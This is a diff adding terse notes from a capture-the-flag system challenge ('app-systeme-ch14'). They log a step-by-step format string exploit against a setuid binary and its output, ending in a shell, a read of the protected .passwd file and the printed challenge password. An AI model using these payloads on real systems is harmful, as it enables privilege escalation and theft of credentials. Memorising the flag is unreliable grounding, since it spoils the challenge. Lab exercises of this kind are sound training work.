@@ -1,0 +1,73 @@
+app-systeme-ch14
+================
+
+==============================================================================
+./ch14 "`python -c 'print "AAAA" + "%x%x%x%x%x%x%x%x%x%x"'`"
+./ch14 "`python -c 'print "AAAA" + "%x" * 10'`"
+
+
+check at 0xbffffb28		# \x28\xfb\xff\xbf
+argv[1] = [AAAA%x%x%x%x%x%x%x%x%x%x]
+fmt=[AAAAb7fdcb48101bffffc540040302014141414164663762]
+check=0x4030201
+==============================================================================
+
+
+==============================================================================
+./ch14 "`python -c 'print "AAAA" + "\x28\xfb\xff\xbf" + "%x%x%x%x%x%x%x%x%x%n"'`"
+
+
+check at 0xbffffb28
+argv[1] = [AAAA(���%x%x%x%x%x%x%x%x%x%n]
+You are on the right way !
+fmt=[AAAA(���b7fdcb48101bffffc5400403020141414141]
+check=0x2c
+==============================================================================
+
+
+==============================================================================
+./ch14 "`python -c 'print "AAAA" + "\x18\xfb\xff\xbfJUNK\x19\xfb\xff\xbf" + "%x%x%x%x%x%x%x%x%12x%n%17x%n"'`"
+
+
+check at 0xbffffb18
+argv[1] = [AAAA���JUNK���%x%x%x%x%x%x%x%x%12x%n%17x%n]
+You are on the right way !
+fmt=[]
+check=0x4938
+==============================================================================
+
+==============================================================================
+./ch14 "`python -c 'print "AAAA" + "\xf8\xfa\xff\xbfJUNK\xf9\xfa\xff\xbfJUNK\xfa\xfa\xff\xbfJUNK\xfb\xfa\xff\xbf" + "%x%x%x%x%x%x%x%x%12x%n%17x%n%17x%n%17x%n"'`"
+
+
+check at 0xbffffaf8
+argv[1] = [AAAA����JUNK����JUNK����JUNK����%x%x%x%x%x%x%x%x%12x%n%17x%n%17x%n%17x%n]
+You are on the right way !
+fmt=[]
+check=0x7b6a5948
+==============================================================================
+
+
+==============================================================================
+./ch14 "`python -c 'print "AAAA" + "\xf8\xfa\xff\xbfJUNK\xf9\xfa\xff\xbfJUNK\xfa\xfa\xff\xbfJUNK\xfb\xfa\xff\xbf" + "%x%x%x%x%x%x%x%x%179x%n%207x%n%239x%n%305x%n"'`"
+check at 0xbffffaf8
+argv[1] = [AAAA����JUNK����JUNK����JUNK����%x%x%x%x%x%x%x%x%179x%n%207x%n%239x%n%305x%n]
+fmt=[]
+check=0xdeadbeef
+Yeah dude ! You win !
+$ ls
+ch14  ch14.c
+$ ls -al
+total 24
+dr-xr-x---  2 app-systeme-ch14-cracked app-systeme-ch14         4096 Aug 10  2015 .
+drwxr-xr-x 19 root                     root                     4096 Jul 23 21:23 ..
+-r-sr-x---  1 app-systeme-ch14-cracked app-systeme-ch14         7362 Apr  7  2015 ch14
+-r--r-----  1 app-systeme-ch14         app-systeme-ch14          611 Aug 10  2015 ch14.c
+-r--------  1 app-systeme-ch14-cracked app-systeme-ch14-cracked   18 Mar 18  2015 .passwd
+$ cat .passwd
+1l1k3p0Rn&P0pC0rn
+$
+==============================================================================
+
+
+
